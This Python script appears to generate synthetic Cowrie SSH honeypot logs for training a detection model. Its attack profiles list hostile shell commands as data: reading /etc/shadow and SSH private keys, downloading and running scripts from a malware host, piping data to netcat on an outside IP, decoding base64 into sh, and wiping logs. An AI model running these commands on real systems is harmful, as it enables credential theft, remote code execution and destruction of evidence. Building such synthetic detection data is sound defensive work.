import json
import csv
import random
import uuid
from datetime import datetime, timedelta
import os
import argparse

ATTACK_PROFILES = [
    {
        "name": "reconnaissance",
        "commands": ["whoami", "uname -a", "pwd", "ls -la", "cat /etc/passwd", "w", "ps aux", "ifconfig", "id", "hostname"],
        "duration_range": (3.0, 25.0),
        "cmd_delay_range": (0.5, 4.0),
        "failed_cmd_rate": (0.0, 0.1),
        "tty_size_range": (500, 3000),
        "spkts_range": (4, 15),
        "dpkts_range": (4, 15),
        "src_ips": ["192.168.1.100", "10.0.0.45", "172.16.0.12", "185.220.101.5"],
    },
    {
        "name": "botnet_malware_download",
        "commands": ["cd /tmp", "wget http://malware-repo.com/b.sh", "curl -O http://185.220.101.5/bot", "chmod +x b.sh", "./b.sh", "rm b.sh"],
        "duration_range": (1.0, 8.0),
        "cmd_delay_range": (0.1, 1.2),
        "failed_cmd_rate": (0.0, 0.2),
        "tty_size_range": (200, 1500),
        "spkts_range": (5, 18),
        "dpkts_range": (5, 20),
        "src_ips": ["185.220.101.5", "193.27.228.11", "45.154.255.85"],
    },
    {
        "name": "privilege_escalation",
        "commands": ["sudo -l", "cat /etc/shadow", "find / -perm -4000 2>/dev/null", "cat /root/.ssh/id_rsa", "crontab -l"],
        "duration_range": (4.0, 30.0),
        "cmd_delay_range": (1.0, 6.0),
        "failed_cmd_rate": (0.1, 0.4),
        "tty_size_range": (800, 4000),
        "spkts_range": (3, 12),
        "dpkts_range": (3, 12),
        "src_ips": ["10.0.0.99", "172.16.5.4", "198.51.100.42"],
    },
    {
        "name": "evasion_anti_forensics",
        "commands": ["unset HISTFILE", "export HISTSIZE=0", "history -c", "rm -rf /var/log/*", "killall rsyslogd"],
        "duration_range": (2.0, 12.0),
        "cmd_delay_range": (0.2, 2.0),
        "failed_cmd_rate": (0.0, 0.3),
        "tty_size_range": (300, 2000),
        "spkts_range": (4, 14),
        "dpkts_range": (4, 14),
        "src_ips": ["198.51.100.42", "203.0.113.15", "185.220.101.5"],
    },
    {
        "name": "brute_force_only",
        "commands": [],
        "duration_range": (0.5, 5.0),
        "cmd_delay_range": (0.0, 0.0),
        "failed_cmd_rate": (0.0, 0.0),
        "tty_size_range": (0, 0),
        "spkts_range": (1, 3),
        "dpkts_range": (1, 3),
        "src_ips": ["193.27.228.11", "45.154.255.85", "185.220.101.5"],
    },
    # -----------------------------------------------------------------------
    # Zero-Day / Novel Attack Flow Profiles for Anomaly Clustering
    # -----------------------------------------------------------------------
    {
        "name": "zero_day_buffer_overflow",
        "commands": ["\x90" * 256 + "NOP_SLIDE_PAYLOAD_EXPLOIT_EXEC"],
        "duration_range": (0.1, 0.4),
        "cmd_delay_range": (0.0, 0.1),
        "failed_cmd_rate": (1.0, 1.0),
        "tty_size_range": (0, 100),
        "spkts_range": (20, 40),
        "dpkts_range": (1, 2),
        "src_ips": ["103.251.167.20"],
    },
    {
        "name": "zero_day_covert_tunnel",
        "commands": ["cat /dev/urandom | base64 | nc 198.51.100.99 4444"],
        "duration_range": (60.0, 180.0),
        "cmd_delay_range": (5.0, 15.0),
        "failed_cmd_rate": (0.0, 0.0),
        "tty_size_range": (100, 500),
        "spkts_range": (50, 120),
        "dpkts_range": (2, 5),
        "src_ips": ["198.51.100.99"],
    },
    {
        "name": "zero_day_obfuscated_memory_attack",
        "commands": ["echo 'c3VkbyBhdHRhY2s=' | base64 -d | sh", "perl -e 'use Socket;...'"],
        "duration_range": (1.5, 4.0),
        "cmd_delay_range": (0.05, 0.2),
        "failed_cmd_rate": (0.0, 0.1),
        "tty_size_range": (1500, 5000),
        "spkts_range": (15, 30),
        "dpkts_range": (15, 35),
        "src_ips": ["91.240.118.50"],
    }
]

def generate_synthetic_sessions(num_sessions=1800, output_sessions='data/parsed/sessions.json'):
    print(f"Generating {num_sessions} synthetic honeypot sessions...")
    
    sessions = {}
    base_time = datetime.utcnow() - timedelta(days=7)
    
    for i in range(num_sessions):
        session_id = uuid.uuid4().hex[:12]
        profile = random.choice(ATTACK_PROFILES)
        
        src_ip = random.choice(profile["src_ips"])
        src_port = random.randint(32768, 61000)
        dst_ip = "172.18.0.2"
        dst_port = 2222
        
        session_events = []
        
        # Session start timestamp
        session_start = base_time + timedelta(seconds=i * random.uniform(20, 60))
        current_time = session_start
        
        # 1. Session connect event
        session_events.append({
            "session": session_id,
            "protocol": "ssh",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "attack_cat": profile["name"],
            "label": 1 if "zero_day" in profile["name"] else (0 if profile["name"] == "reconnaissance" else 1),
            "eventid": "cowrie.session.connect",
            "timestamp": current_time.isoformat() + "Z"
        })
        
        # 2. Client version
        current_time += timedelta(milliseconds=random.randint(5, 50))
        session_events.append({
            "session": session_id,
            "protocol": "ssh",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "version": "SSH-2.0-OpenSSH_8.2p1",
            "eventid": "cowrie.client.version",
            "timestamp": current_time.isoformat() + "Z"
        })

        # 3. Client KEX
        current_time += timedelta(milliseconds=random.randint(10, 80))
        session_events.append({
            "session": session_id,
            "protocol": "ssh",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "eventid": "cowrie.client.kex",
            "timestamp": current_time.isoformat() + "Z"
        })

        # 4. Authentication (Login)
        auth_success = random.choice([1, 1, 1, 0]) if profile["commands"] else random.choice([0, 0, 1])
        current_time += timedelta(milliseconds=random.randint(50, 300))
        login_event = "cowrie.login.success" if auth_success else "cowrie.login.failed"
        session_events.append({
            "session": session_id,
            "protocol": "ssh",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "username": random.choice(["root", "admin", "user", "ubuntu"]),
            "password": random.choice(["123456", "password", "root", "admin123"]),
            "eventid": login_event,
            "timestamp": current_time.isoformat() + "Z"
        })

        # If login succeeded and profile has commands, execute commands
        if auth_success and profile["commands"]:
            # Client size event (terminal spawn)
            current_time += timedelta(milliseconds=random.randint(20, 100))
            session_events.append({
                "session": session_id,
                "protocol": "ssh",
                "src_ip": src_ip,
                "src_port": src_port,
                "dst_ip": dst_ip,
                "dst_port": dst_port,
                "width": 80,
                "height": 24,
                "eventid": "cowrie.client.size",
                "timestamp": current_time.isoformat() + "Z"
            })
            
            # Choose random commands from profile
            max_cmds = len(profile["commands"])
            min_cmds = 1 if max_cmds == 1 else 2
            num_cmds = random.randint(min_cmds, max_cmds)
            selected_cmds = random.sample(profile["commands"], num_cmds)
            
            for cmd in selected_cmds:
                delay = random.uniform(*profile["cmd_delay_range"])
                current_time += timedelta(seconds=delay)
                
                # Check if command fails
                if random.random() < random.uniform(*profile["failed_cmd_rate"]):
                    session_events.append({
                        "session": session_id,
                        "protocol": "ssh",
                        "src_ip": src_ip,
                        "src_port": src_port,
                        "dst_ip": dst_ip,
                        "dst_port": dst_port,
                        "input": cmd,
                        "eventid": "cowrie.command.failed",
                        "timestamp": current_time.isoformat() + "Z"
                    })
                else:
                    session_events.append({
                        "session": session_id,
                        "protocol": "ssh",
                        "src_ip": src_ip,
                        "src_port": src_port,
                        "dst_ip": dst_ip,
                        "dst_port": dst_port,
                        "input": cmd,
                        "eventid": "cowrie.command.input",
                        "timestamp": current_time.isoformat() + "Z"
                    })

        # Calculate session duration
        total_duration = (current_time - session_start).total_seconds()
        duration_ms = int(total_duration * 1000)
        
        # Log closed event
        current_time += timedelta(milliseconds=random.randint(10, 100))
        tty_size = random.randint(*profile["tty_size_range"]) if auth_success else 0
        session_events.append({
            "session": session_id,
            "protocol": "ssh",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "size": tty_size,
            "duration_ms": duration_ms,
            "eventid": "cowrie.log.closed",
            "timestamp": current_time.isoformat() + "Z"
        })

        # Session closed event
        session_events.append({
            "session": session_id,
            "protocol": "ssh",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "duration_ms": duration_ms,
            "eventid": "cowrie.session.closed",
            "timestamp": current_time.isoformat() + "Z"
        })
        
        sessions[session_id] = session_events

    os.makedirs(os.path.dirname(output_sessions), exist_ok=True)
    with open(output_sessions, 'w') as f:
        json.dump(sessions, f, indent=2)
        
    print(f"Successfully generated {len(sessions)} synthetic sessions saved to {output_sessions}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Generate synthetic dataset of honeypot sessions")
    parser.add_argument("--sessions", type=int, default=1800, help="Number of sessions to generate (default: 1800)")
    parser.add_argument("--output", type=str, default="data/parsed/sessions.json", help="Output path for sessions.json")
    
    args = parser.parse_args()
    generate_synthetic_sessions(args.sessions, args.output)
